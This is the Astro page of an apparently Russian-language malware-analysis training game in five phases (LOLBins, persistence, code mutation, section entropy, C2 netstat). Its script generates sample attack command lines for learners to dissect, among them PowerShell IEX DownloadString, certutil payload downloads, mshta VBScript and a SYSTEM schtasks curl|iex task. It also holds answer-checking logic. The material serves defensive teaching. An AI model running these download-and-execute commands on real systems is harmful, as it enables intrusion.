---
import TaskLayout from '../../../../layouts/TaskLayout.astro';
---

<TaskLayout level={2}>
    <div class="container my-4">
        <div class="d-flex justify-content-between align-items-center mb-3">
            <h2 class="h4 text-warning font-monospace mb-0">Тренажер: Анализ вредоносного ПО (Уровень 2: Продвинутый)</h2>
            <span class="badge border border-warning text-warning bg-dark rounded-0 px-3 py-2 font-monospace">Продвинутый режим (Ручной ввод)</span>
        </div>

        <div id="game-container" class="card bg-dark border-warning rounded-0">
            <div class="card-body p-4">
                
                <!-- Фаза 1 -->
                <div id="phase1" class="phase-container">
                    <div class="d-flex justify-content-between align-items-center mb-3 border-bottom border-secondary pb-2">
                        <h4 class="h5 text-warning font-monospace mb-0">Шаг 1 из 5: Анализ бесфайловой активности и утилит LOLBins</h4>
                        <span class="badge bg-warning text-dark rounded-0">Фаза 1</span>
                    </div>
                    <p class="text-light">
                        Злоумышленники использовали доверенную системную утилиту (LOLBin) для бесфайлового исполнения вредоносного кода в памяти.
                        Проанализируйте командную строку запуска процесса и извлеките требуемый параметр компрометации.
                    </p>

                    <div class="card bg-black border-warning rounded-0 p-3 mb-3 font-monospace">
                        <div class="text-secondary small mb-2">ПЕРЕХВАЧЕННЫЙ ВЫЗОВ ПРОЦЕССА В ЖУРНАЛЕ СОБЫТИЙ:</div>
                        <div id="p1-cmdline" class="text-warning text-break fs-6 p-2 bg-dark border border-secondary mb-2"></div>
                        <div class="text-light small">
                            Цель расследования: <span id="p1-question-prompt" class="text-info fw-bold"></span>
                        </div>
                    </div>

                    <div class="card bg-dark border-secondary rounded-0 p-3 mb-3">
                        <label for="p1-input" class="form-label text-light font-monospace small mb-2">
                            Введите точное значение (без кавычек и лишних пробелов):
                        </label>
                        <div class="input-group">
                            <input type="text" id="p1-input" class="form-control bg-black text-warning border-warning rounded-0 font-monospace fs-5" placeholder="Введите ответ..." autocomplete="off">
                            <button id="p1-btn" class="btn btn-outline-warning rounded-0 font-monospace px-4">ВВОД</button>
                        </div>
                    </div>

                    <div id="p1-feedback" class="alert alert-danger rounded-0 border-danger d-none font-monospace py-2" role="alert">
                        [ОШИБКА АНАЛИЗА] Неверный параметр компрометации! Регенерация сценария...
                    </div>
                </div>

                <!-- Фаза 2 -->
                <div id="phase2" class="phase-container d-none">
                    <div class="d-flex justify-content-between align-items-center mb-3 border-bottom border-secondary pb-2">
                        <h4 class="h5 text-warning font-monospace mb-0">Шаг 2 из 5: Расследование механизмов персистентности (Persistence)</h4>
                        <span class="badge bg-warning text-dark rounded-0">Фаза 2</span>
                    </div>
                    <p class="text-light">
                        Для сохранения доступа и автоматического запуска после перезагрузки вредоносная программа создала объект автозапуска.
                        Изучите конфигурационный дамп и локализуйте артефакт закрепления в системе.
                    </p>

                    <div class="card bg-black border-warning rounded-0 p-3 mb-3 font-monospace">
                        <div class="text-secondary small mb-2">ДАМП АВТОЗАГРУЗКИ / ПЛАНИРОВЩИКА ЗАДАЧ:</div>
                        <pre id="p2-dump" class="text-warning p-2 bg-dark border border-secondary mb-2 font-monospace small mb-0"></pre>
                        <div class="text-light small mt-2">
                            Требуется найти: <span id="p2-question-prompt" class="text-info fw-bold"></span>
                        </div>
                    </div>

                    <div class="card bg-dark border-secondary rounded-0 p-3 mb-3">
                        <label for="p2-input" class="form-label text-light font-monospace small mb-2">
                            Введите обнаруженное значение:
                        </label>
                        <div class="input-group">
                            <input type="text" id="p2-input" class="form-control bg-black text-warning border-warning rounded-0 font-monospace fs-5" placeholder="Введите ответ..." autocomplete="off">
                            <button id="p2-btn" class="btn btn-outline-warning rounded-0 font-monospace px-4">ВВОД</button>
                        </div>
                    </div>

                    <div id="p2-feedback" class="alert alert-danger rounded-0 border-danger d-none font-monospace py-2" role="alert">
                        [ОШИБКА ЛОКАЛИЗАЦИИ] Неверный артефакт автозагрузки! Новый дамп конфигурации...
                    </div>
                </div>

                <!-- Фаза 3 -->
                <div id="phase3" class="phase-container d-none">
                    <div class="d-flex justify-content-between align-items-center mb-3 border-bottom border-secondary pb-2">
                        <h4 class="h5 text-warning font-monospace mb-0">Шаг 3 из 5: Анализ механизмов мутации кода (Полиморфизм vs Метаморфизм)</h4>
                        <span class="badge bg-warning text-dark rounded-0">Фаза 3</span>
                    </div>
                    <p class="text-light">
                        Сопоставьте архитектурные признаки маскировки исполняемого кода и определите технологию мутации по классификации Полякова.
                    </p>

                    <div class="card bg-black border-warning rounded-0 p-3 mb-3 font-monospace">
                        <div class="text-secondary small mb-2">ЛИСТИНГ ДВУХ ПОКОЛЕНИЙ ОБРАЗЦА ВИРУСА:</div>
                        <div class="row g-2 mb-2">
                            <div class="col-md-6">
                                <div class="bg-dark p-2 border border-secondary">
                                    <span class="text-secondary small d-block">ПОКОЛЕНИЕ A:</span>
                                    <pre id="p3-gen-a" class="text-light small mb-0"></pre>
                                </div>
                            </div>
                            <div class="col-md-6">
                                <div class="bg-dark p-2 border border-secondary">
                                    <span class="text-secondary small d-block">ПОКОЛЕНИЕ B:</span>
                                    <pre id="p3-gen-b" class="text-light small mb-0"></pre>
                                </div>
                            </div>
                        </div>
                        <div class="text-light small">
                            Аналитическое описание: <span id="p3-desc" class="text-warning"></span>
                        </div>
                    </div>

                    <div class="card bg-dark border-secondary rounded-0 p-3 mb-3">
                        <label for="p3-input" class="form-label text-light font-monospace small mb-2">
                            Введите термин технологии (например: <span class="text-warning">полиморфизм</span> или <span class="text-warning">метаморфизм</span>):
                        </label>
                        <div class="input-group">
                            <input type="text" id="p3-input" class="form-control bg-black text-warning border-warning rounded-0 font-monospace fs-5" placeholder="Введите термин..." autocomplete="off">
                            <button id="p3-btn" class="btn btn-outline-warning rounded-0 font-monospace px-4">ВВОД</button>
                        </div>
                    </div>

                    <div id="p3-feedback" class="alert alert-danger rounded-0 border-danger d-none font-monospace py-2" role="alert">
                        [ОШИБКА ДЕТЕКТИРОВАНИЯ] Неверно определена технология мутации! Новая пара образцов...
                    </div>
                </div>

                <!-- Фаза 4 -->
                <div id="phase4" class="phase-container d-none">
                    <div class="d-flex justify-content-between align-items-center mb-3 border-bottom border-secondary pb-2">
                        <h4 class="h5 text-warning font-monospace mb-0">Шаг 4 из 5: Расчет энтропии и выявление криптованного тела</h4>
                        <span class="badge bg-warning text-dark rounded-0">Фаза 4</span>
                    </div>
                    <p class="text-light">
                        Для выявления скрытых зашифрованных тел вирусов и упаковщиков антивирус производит расчет энтропии Шеннона по секциям PE-файла.
                        Нормальный компилированный код имеет энтропию 5.0–6.5 бит/байт, а зашифрованный массив приближается к теоретическому максимуму 8.0.
                    </p>

                    <div class="card bg-black border-warning rounded-0 p-3 mb-3 font-monospace">
                        <div class="text-secondary small mb-2">ТАБЛИЦА СЕКЦИЙ ИССЛЕДУЕМОГО ИСПОЛНЯЕМОГО ФАЙЛА:</div>
                        <div class="table-responsive">
                            <table class="table table-dark table-sm table-bordered border-secondary text-center font-monospace mb-0">
                                <thead>
                                    <tr>
                                        <th class="bg-black text-secondary">Секция</th>
                                        <th class="bg-black text-secondary">Виртуальный размер</th>
                                        <th class="bg-black text-secondary">Права доступа</th>
                                        <th class="bg-black text-secondary">Энтропия (бит/байт)</th>
                                    </tr>
                                </thead>
                                <tbody id="p4-table-body">
                                    <!-- Генерируется через JS -->
                                </tbody>
                            </table>
                        </div>
                        <div class="text-light small mt-2">
                            Вопрос: <span id="p4-question-text" class="text-info fw-bold"></span>
                        </div>
                    </div>

                    <div class="card bg-dark border-secondary rounded-0 p-3 mb-3">
                        <label for="p4-input" class="form-label text-light font-monospace small mb-2">
                            Введите ответ:
                        </label>
                        <div class="input-group">
                            <input type="text" id="p4-input" class="form-control bg-black text-warning border-warning rounded-0 font-monospace fs-5" placeholder="Введите имя секции..." autocomplete="off">
                            <button id="p4-btn" class="btn btn-outline-warning rounded-0 font-monospace px-4">ВВОД</button>
                        </div>
                    </div>

                    <div id="p4-feedback" class="alert alert-danger rounded-0 border-danger d-none font-monospace py-2" role="alert">
                        [ОШИБКА ЭНТРОПИЙНОГО АНАЛИЗА] Неверная секция или расчет! Пересчет структуры файла...
                    </div>
                </div>

                <!-- Фаза 5 -->
                <div id="phase5" class="phase-container d-none">
                    <div class="d-flex justify-content-between align-items-center mb-3 border-bottom border-secondary pb-2">
                        <h4 class="h5 text-warning font-monospace mb-0">Шаг 5 из 5: Сетевой дамп и локализация командного C2-центра</h4>
                        <span class="badge bg-warning text-dark rounded-0">Фаза 5</span>
                    </div>
                    <p class="text-light">
                        Бэкдор поддерживает скрытый канал управления с командным C2-сервером (Command & Control).
                        Проанализируйте активные сетевые подключения таблицы <code class="text-warning">netstat -ano</code> и вычислите скомпрометированный параметр для блокировки.
                    </p>

                    <div class="card bg-black border-warning rounded-0 p-3 mb-3 font-monospace">
                        <div class="text-secondary small mb-2">ДАМП АКТИВНЫХ СЕТЕВЫХ СОЕДИНЕНИЙ (NETSTAT):</div>
                        <div class="table-responsive">
                            <table class="table table-dark table-sm table-bordered border-secondary font-monospace small text-center mb-0">
                                <thead>
                                    <tr>
                                        <th>Протокол</th>
                                        <th>Локальный адрес</th>
                                        <th>Внешний адрес</th>
                                        <th>Состояние</th>
                                        <th>PID</th>
                                        <th>Процесс / Путь</th>
                                    </tr>
                                </thead>
                                <tbody id="p5-table-body">
                                    <!-- Генерируется через JS -->
                                </tbody>
                            </table>
                        </div>
                        <div class="text-light small mt-2">
                            Задача аналитика: <span id="p5-task-prompt" class="text-info fw-bold"></span>
                        </div>
                    </div>

                    <div class="card bg-dark border-secondary rounded-0 p-3 mb-3">
                        <label for="p5-input" class="form-label text-light font-monospace small mb-2">
                            Введите найденное значение:
                        </label>
                        <div class="input-group">
                            <input type="text" id="p5-input" class="form-control bg-black text-warning border-warning rounded-0 font-monospace fs-5" placeholder="например: 185.220.101.5 или 4444 или 3240" autocomplete="off">
                            <button id="p5-btn" class="btn btn-outline-warning rounded-0 font-monospace px-4">ВВОД</button>
                        </div>
                    </div>

                    <div id="p5-feedback" class="alert alert-danger rounded-0 border-danger d-none font-monospace py-2" role="alert">
                        [ОШИБКА СЕТЕВОЙ ЛОКАЛИЗАЦИИ] Неверный параметр C2-соединения! Реконфигурация сетевой сессии...
                    </div>
                </div>

                <!-- Экран завершения -->
                <div id="success-screen" class="phase-container d-none text-center py-5">
                    <div class="mb-3 text-warning font-monospace display-4">✓ УРОВЕНЬ 2 УСПЕШНО ЗАВЕРШЕН</div>
                    <h3 class="text-light font-monospace mb-3">Практический аудит и анализ артефактов Malware освоен</h3>
                    <p class="text-secondary max-w-md mx-auto mb-4">
                        Вы успешно проанализировали вызовы LOLBins, локализовали ключи персистентности, различили полиморфный и метаморфный код, рассчитали энтропию секций и перехватили канал связи с C2-сервером.
                    </p>
                    <div class="badge border border-warning text-warning bg-black p-3 font-monospace fs-6 rounded-0">
                        Уровень 2 пройден. Переходите на Уровень 3 (Аркада / Hardcore) в верхней панели!
                    </div>
                </div>

            </div>
        </div>
    </div>

    <script is:inline>
        const missionName = 'Урок 20 :: Вредоносное ПО и методы борьбы с ним (Уровень 2)';
        const startTime = Date.now();
        let attempts = 0;

        function sendTelemetry(action_type, success = false) {
            const timeSpent = Math.floor((Date.now() - startTime) / 1000);
            window.parent.postMessage({
                type: 'TELEMETRY_EVENT',
                mission_name: missionName,
                action_type: action_type,
                status: action_type === 'level_complete' ? 'completed' : 'in_progress',
                start_time: new Date(startTime).toISOString(),
                time_spent_sec: timeSpent,
                attempts_count: attempts,
                success: success
            }, '*');
        }

        function rnd(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }

        function shuffle(arr) {
            const a = [...arr];
            for (let i = a.length - 1; i > 0; i--) {
                const j = Math.floor(Math.random() * (i + 1));
                [a[i], a[j]] = [a[j], a[i]];
            }
            return a;
        }

        function generateHex(len) {
            const hex = '0123456789abcdef';
            let res = '';
            for (let i = 0; i < len; i++) res += hex[rnd(0, hex.length - 1)];
            return res;
        }

        function generateIp() {
            return `${rnd(45, 195)}.${rnd(10, 240)}.${rnd(1, 250)}.${rnd(2, 254)}`;
        }

        // ==========================================
        // ФАЗА 1: Анализ бесфайловой активности LOLBins
        // ==========================================
        let p1ExpectedAnswer = '';

        function initPhase1() {
            const lolbins = [
                {
                    bin: 'powershell.exe',
                    qType: 'bin',
                    prompt: 'Укажите исполняемое имя системной утилиты (с расширением .exe), запущенной для обхода политик:',
                    genCmd: () => {
                        const port = rnd(8000, 9999);
                        const ip = generateIp();
                        return `powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://${ip}:${port}/payload.ps1')"`;
                    },
                    ans: () => 'powershell.exe'
                },
                {
                    bin: 'certutil.exe',
                    qType: 'param',
                    prompt: 'Укажите сетевой IP-адрес удаленного узла, с которого утилита certutil скачивает файл:',
                    genCmd: () => {
                        const ip = generateIp();
                        const file = `stage_${rnd(1, 9)}.bin`;
                        return `certutil.exe -urlcache -split -f http://${ip}:8080/${file} %TEMP%\\svchost.exe`;
                    },
                    ans: (ip) => ip
                },
                {
                    bin: 'mshta.exe',
                    qType: 'bin',
                    prompt: 'Укажите имя утилиты Windows (с расширением .exe), используемой для выполнения VBScript из строки:',
                    genCmd: () => {
                        return `mshta.exe vbscript:Close(Execute("CreateObject(""WScript.Shell"").Run ""cmd.exe /c calc.exe"",0"))`;
                    },
                    ans: () => 'mshta.exe'
                },
                {
                    bin: 'powershell.exe',
                    qType: 'flag',
                    prompt: 'Укажите аргумент командной строки PowerShell, отключающий политику ограничения запуска скриптов:',
                    genCmd: () => {
                        return `powershell.exe -NoProfile -ExecutionPolicy Bypass -NonInteractive -EncodedCommand JABjACAAPQAg...`;
                    },
                    ans: () => 'Bypass'
                }
            ];

            const selected = lolbins[rnd(0, lolbins.length - 1)];
            let cmd = '';
            let expected = '';

            if (selected.qType === 'param') {
                const ip = generateIp();
                cmd = `certutil.exe -urlcache -split -f http://${ip}:8080/stage_${rnd(1, 9)}.bin %TEMP%\\payload.exe`;
                expected = ip;
            } else {
                cmd = selected.genCmd();
                expected = selected.ans();
            }

            p1ExpectedAnswer = expected;
            document.getElementById('p1-cmdline').textContent = cmd;
            document.getElementById('p1-question-prompt').textContent = selected.prompt;

            const input = document.getElementById('p1-input');
            input.value = '';
            input.focus();
        }

        function handlePhase1Submit() {
            const input = document.getElementById('p1-input');
            const btn = document.getElementById('p1-btn');
            const feedback = document.getElementById('p1-feedback');

            const val = input.value.trim().toLowerCase();
            const expected = p1ExpectedAnswer.toLowerCase();

            if (val === expected || (expected.endsWith('.exe') && val === expected.replace('.exe', ''))) {
                document.getElementById('phase1').classList.add('d-none');
                document.getElementById('phase2').classList.remove('d-none');
                sendTelemetry('in_progress');
                initPhase2();
            } else {
                attempts++;
                sendTelemetry('hardcore_reset');
                input.disabled = true;
                btn.disabled = true;
                feedback.classList.remove('d-none');
                setTimeout(() => {
                    initPhase1();
                    input.disabled = false;
                    btn.disabled = false;
                    feedback.classList.add('d-none');
                    input.focus();
                }, 1200);
            }
        }

        document.getElementById('p1-btn').addEventListener('click', handlePhase1Submit);
        document.getElementById('p1-input').addEventListener('keydown', (e) => {
            if (e.key === 'Enter') handlePhase1Submit();
        });

        // ==========================================
        // ФАЗА 2: Расследование персистентности (Persistence)
        // ==========================================
        let p2ExpectedAnswer = '';

        function initPhase2() {
            const persistenceTypes = [
                {
                    type: 'reg',
                    gen: () => {
                        const fakeExe = `sys_update_${rnd(10, 99)}.exe`;
                        const keyName = `WindowsSecurityService${rnd(1, 9)}`;
                        const dump = `[HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n"${keyName}"="C:\\\\Users\\\\Admin\\\\AppData\\\\Local\\\\Temp\\\\${fakeExe}"\n"SecurityHealth"="C:\\\\Windows\\\\System32\\\\SecurityHealthSystray.exe"`;
                        return {
                            dump: dump,
                            prompt: `Введите точное имя подозрительного исполняемого файла (например: ${fakeExe}):`,
                            ans: fakeExe
                        };
                    }
                },
                {
                    type: 'cron',
                    gen: () => {
                        const min = rnd(2, 15);
                        const script = `/tmp/.miner_${rnd(100, 999)}.sh`;
                        const dump = `# /etc/cron.d/sys_sync\nSHELL=/bin/bash\nPATH=/sbin:/bin:/usr/sbin:/usr/bin\n*/${min} * * * * root ${script} >/dev/null 2>&1`;
                        return {
                            dump: dump,
                            prompt: `С каким интервалом (в минутах) запускается вредоносная задача? Введите число (минуты):`,
                            ans: min.toString()
                        };
                    }
                },
                {
                    type: 'schtasks',
                    gen: () => {
                        const taskName = `GoogleUpdateTask_${rnd(1000, 9999)}`;
                        const dump = `schtasks /create /tn "${taskName}" /tr "powershell -WindowStyle Hidden -c (curl http://${generateIp()}/a.ps1|iex)" /sc onlogon /ru SYSTEM`;
                        return {
                            dump: dump,
                            prompt: `Введите имя нелегитимной созданной задачи (/tn):`,
                            ans: taskName
                        };
                    }
                }
            ];

            const item = persistenceTypes[rnd(0, persistenceTypes.length - 1)].gen();
            p2ExpectedAnswer = item.ans;

            document.getElementById('p2-dump').textContent = item.dump;
            document.getElementById('p2-question-prompt').textContent = item.prompt;

            const input = document.getElementById('p2-input');
            input.value = '';
            input.focus();
        }

        function handlePhase2Submit() {
            const input = document.getElementById('p2-input');
            const btn = document.getElementById('p2-btn');
            const feedback = document.getElementById('p2-feedback');

            const val = input.value.trim().toLowerCase();
            const expected = p2ExpectedAnswer.toLowerCase();

            if (val === expected) {
                document.getElementById('phase2').classList.add('d-none');
                document.getElementById('phase3').classList.remove('d-none');
                sendTelemetry('in_progress');
                initPhase3();
            } else {
                attempts++;
                sendTelemetry('hardcore_reset');
                input.disabled = true;
                btn.disabled = true;
                feedback.classList.remove('d-none');
                setTimeout(() => {
                    initPhase2();
                    input.disabled = false;
                    btn.disabled = false;
                    feedback.classList.add('d-none');
                    input.focus();
                }, 1200);
            }
        }

        document.getElementById('p2-btn').addEventListener('click', handlePhase2Submit);
        document.getElementById('p2-input').addEventListener('keydown', (e) => {
            if (e.key === 'Enter') handlePhase2Submit();
        });

        // ==========================================
        // ФАЗА 3: Полиморфизм vs Метаморфизм
        // ==========================================
        let p3ExpectedAnswer = '';

        function initPhase3() {
            const isPolymorphic = Math.random() > 0.5;

            if (isPolymorphic) {
                // Полиморфизм: зашифрованное тело + мутирующий дешифратор
                const key1 = `0x${generateHex(2)}`;
                const key2 = `0x${generateHex(2)}`;
                const reg1 = 'esi';
                const reg2 = 'edi';

                document.getElementById('p3-gen-a').textContent = 
`mov ${reg1}, 0x401000\nmov ecx, 256\nloop_decode:\nxor byte ptr [${reg1}], ${key1}\ninc ${reg1}\nloop loop_decode\n[--- ЗАШИФРОВАННЫЙ БЛОК ДАННЫХ ---]`;

                document.getElementById('p3-gen-b').textContent = 
`mov ${reg2}, 0x401000\nnop\nxor ecx, ecx\nmov cl, 255\ndecrypt_cycle:\nxor byte ptr [${reg2}], ${key2}\nadd ${reg2}, 1\ndec cl\njnz decrypt_cycle\n[--- ЗАШИФРОВАННЫЙ БЛОК ДАННЫХ ---]`;

                document.getElementById('p3-desc').textContent = 
                    'Тело вредоносной программы зашифровано переменным ключом, а запуск осуществляется через уникальный мутирующий дешифратор.';
                p3ExpectedAnswer = 'полиморфизм';
            } else {
                // Метаморфизм: отсутствие дешифратора, замена команд эквивалентами
                document.getElementById('p3-gen-a').textContent = 
`xor eax, eax\nmov ecx, 10\npush ebx\ncall payload_routine\nadd esp, 4\nret`;

                document.getElementById('p3-gen-b').textContent = 
`sub eax, eax\nnop\nxor edx, edx\nmov cl, 10\npush ebx\njmp skip_junk\njunk_bytes db 0x90, 0x90\nskip_junk:\ncall payload_routine\nsub esp, -4\nret`;

                document.getElementById('p3-desc').textContent = 
                    'Вирус не использует шифрование и дешифраторы. Код полностью перекомпилирован с заменой ассемблерных инструкций на эквивалентные.';
                p3ExpectedAnswer = 'метаморфизм';
            }

            const input = document.getElementById('p3-input');
            input.value = '';
            input.focus();
        }

        function handlePhase3Submit() {
            const input = document.getElementById('p3-input');
            const btn = document.getElementById('p3-btn');
            const feedback = document.getElementById('p3-feedback');

            const val = input.value.trim().toLowerCase();
            const expected = p3ExpectedAnswer.toLowerCase();

            if (val === expected || val === expected + 'ный' || val === expected + 'ный код') {
                document.getElementById('phase3').classList.add('d-none');
                document.getElementById('phase4').classList.remove('d-none');
                sendTelemetry('in_progress');
                initPhase4();
            } else {
                attempts++;
                sendTelemetry('hardcore_reset');
                input.disabled = true;
                btn.disabled = true;
                feedback.classList.remove('d-none');
                setTimeout(() => {
                    initPhase3();
                    input.disabled = false;
                    btn.disabled = false;
                    feedback.classList.add('d-none');
                    input.focus();
                }, 1200);
            }
        }

        document.getElementById('p3-btn').addEventListener('click', handlePhase3Submit);
        document.getElementById('p3-input').addEventListener('keydown', (e) => {
            if (e.key === 'Enter') handlePhase3Submit();
        });

        // ==========================================
        // ФАЗА 4: Расчет энтропии и поиск секций
        // ==========================================
        let p4ExpectedAnswer = '';

        function initPhase4() {
            const normalSections = [
                { name: '.text', size: `${rnd(20, 60)} KB`, perms: 'R-X (Execute)', entropy: (rnd(58, 64) / 10).toFixed(2) },
                { name: '.rdata', size: `${rnd(8, 24)} KB`, perms: 'R-- (Read-Only)', entropy: (rnd(45, 52) / 10).toFixed(2) },
                { name: '.data', size: `${rnd(4, 16)} KB`, perms: 'RW- (Read-Write)', entropy: (rnd(30, 42) / 10).toFixed(2) },
                { name: '.rsrc', size: `${rnd(6, 18)} KB`, perms: 'R-- (Read-Only)', entropy: (rnd(48, 55) / 10).toFixed(2) }
            ];

            const packedNames = ['.upx1', '.crypted', '.vmp0', '.themida', '.pack'];
            const cryptSectionName = packedNames[rnd(0, packedNames.length - 1)];
            const cryptEntropy = (rnd(785, 799) / 100).toFixed(2);

            const cryptSection = {
                name: cryptSectionName,
                size: `${rnd(40, 120)} KB`,
                perms: 'RWX (Read-Write-Execute)',
                entropy: cryptEntropy
            };

            const allSections = shuffle([...normalSections, cryptSection]);

            const tbody = document.getElementById('p4-table-body');
            tbody.innerHTML = '';
            allSections.forEach(sec => {
                const tr = document.createElement('tr');
                tr.innerHTML = `
                    <td class="text-warning fw-bold">${sec.name}</td>
                    <td>${sec.size}</td>
                    <td class="${sec.perms.includes('RWX') ? 'text-danger fw-bold' : 'text-secondary'}">${sec.perms}</td>
                    <td class="${parseFloat(sec.entropy) > 7.5 ? 'text-danger fw-bold fs-6' : 'text-light'}">${sec.entropy}</td>
                `;
                tbody.appendChild(tr);
            });

            document.getElementById('p4-question-text').textContent = 
                `Введите имя секции, содержащей зашифрованное тело вируса или упаковщик (наивысшая энтропия):`;
            p4ExpectedAnswer = cryptSectionName;

            const input = document.getElementById('p4-input');
            input.value = '';
            input.focus();
        }

        function handlePhase4Submit() {
            const input = document.getElementById('p4-input');
            const btn = document.getElementById('p4-btn');
            const feedback = document.getElementById('p4-feedback');

            const val = input.value.trim().toLowerCase();
            const expected = p4ExpectedAnswer.toLowerCase();

            if (val === expected || val === expected.replace('.', '')) {
                document.getElementById('phase4').classList.add('d-none');
                document.getElementById('phase5').classList.remove('d-none');
                sendTelemetry('in_progress');
                initPhase5();
            } else {
                attempts++;
                sendTelemetry('hardcore_reset');
                input.disabled = true;
                btn.disabled = true;
                feedback.classList.remove('d-none');
                setTimeout(() => {
                    initPhase4();
                    input.disabled = false;
                    btn.disabled = false;
                    feedback.classList.add('d-none');
                    input.focus();
                }, 1200);
            }
        }

        document.getElementById('p4-btn').addEventListener('click', handlePhase4Submit);
        document.getElementById('p4-input').addEventListener('keydown', (e) => {
            if (e.key === 'Enter') handlePhase4Submit();
        });

        // ==========================================
        // ФАЗА 5: Сетевой дамп и C2-центр
        // ==========================================
        let p5ExpectedAnswer = '';

        function initPhase5() {
            const c2Ip = generateIp();
            const c2Port = [4444, 1337, 8888, 9001, 7777][rnd(0, 4)];
            const maliciousPid = rnd(2100, 8900);
            const maliciousExe = ['svchost.exe (C:\\Users\\Temp\\)', 'spoolsv.exe (C:\\AppData\\)', 'wininit.exe (C:\\Temp\\)'][rnd(0, 2)];

            const benignEntries = [
                { proto: 'TCP', loc: '192.168.1.105:49152', rem: '20.190.159.0:443', state: 'ESTABLISHED', pid: 1044, proc: 'svchost.exe (System32)' },
                { proto: 'TCP', loc: '192.168.1.105:49158', rem: '142.250.180.14:443', state: 'ESTABLISHED', pid: 3412, proc: 'chrome.exe' },
                { proto: 'TCP', loc: '192.168.1.105:51204', rem: '162.159.130.233:443', state: 'ESTABLISHED', pid: 5120, proc: 'discord.exe' },
                { proto: 'TCP', loc: '0.0.0.0:135', rem: '0.0.0.0:0', state: 'LISTENING', pid: 820, proc: 'svchost.exe (System32)' }
            ];

            const c2Entry = {
                proto: 'TCP',
                loc: `192.168.1.105:${rnd(49200, 55000)}`,
                rem: `${c2Ip}:${c2Port}`,
                state: 'ESTABLISHED',
                pid: maliciousPid,
                proc: maliciousExe
            };

            const allRows = shuffle([...benignEntries, c2Entry]);

            const tbody = document.getElementById('p5-table-body');
            tbody.innerHTML = '';
            allRows.forEach(row => {
                const tr = document.createElement('tr');
                const isMal = row.pid === maliciousPid;
                tr.innerHTML = `
                    <td>${row.proto}</td>
                    <td>${row.loc}</td>
                    <td class="${isMal ? 'text-danger fw-bold' : ''}">${row.rem}</td>
                    <td>${row.state}</td>
                    <td class="${isMal ? 'text-warning fw-bold' : ''}">${row.pid}</td>
                    <td class="${isMal ? 'text-danger' : 'text-secondary'}">${row.proc}</td>
                `;
                tbody.appendChild(tr);
            });

            // Выбираем тип вопроса: IP или PID
            const qChoice = rnd(1, 2);
            if (qChoice === 1) {
                document.getElementById('p5-task-prompt').textContent = 
                    `Введите внешний IP-адрес командного сервера злоумышленника (C2-сервера), к которому подключен бэкдор:`;
                p5ExpectedAnswer = c2Ip;
            } else {
                document.getElementById('p5-task-prompt').textContent = 
                    `Введите идентификатор процесса (PID) вредоносной программы для немедленного уничтожения:`;
                p5ExpectedAnswer = maliciousPid.toString();
            }

            const input = document.getElementById('p5-input');
            input.value = '';
            input.focus();
        }

        function handlePhase5Submit() {
            const input = document.getElementById('p5-input');
            const btn = document.getElementById('p5-btn');
            const feedback = document.getElementById('p5-feedback');

            const val = input.value.trim().toLowerCase();
            const expected = p5ExpectedAnswer.toLowerCase();

            if (val === expected) {
                document.getElementById('phase5').classList.add('d-none');
                document.getElementById('success-screen').classList.remove('d-none');
                sendTelemetry('level_complete', true);
            } else {
                attempts++;
                sendTelemetry('hardcore_reset');
                input.disabled = true;
                btn.disabled = true;
                feedback.classList.remove('d-none');
                setTimeout(() => {
                    initPhase5();
                    input.disabled = false;
                    btn.disabled = false;
                    feedback.classList.add('d-none');
                    input.focus();
                }, 1200);
            }
        }

        document.getElementById('p5-btn').addEventListener('click', handlePhase5Submit);
        document.getElementById('p5-input').addEventListener('keydown', (e) => {
            if (e.key === 'Enter') handlePhase5Submit();
        });

        // Запуск
        sendTelemetry('in_progress');
        initPhase1();
    </script>
</TaskLayout>
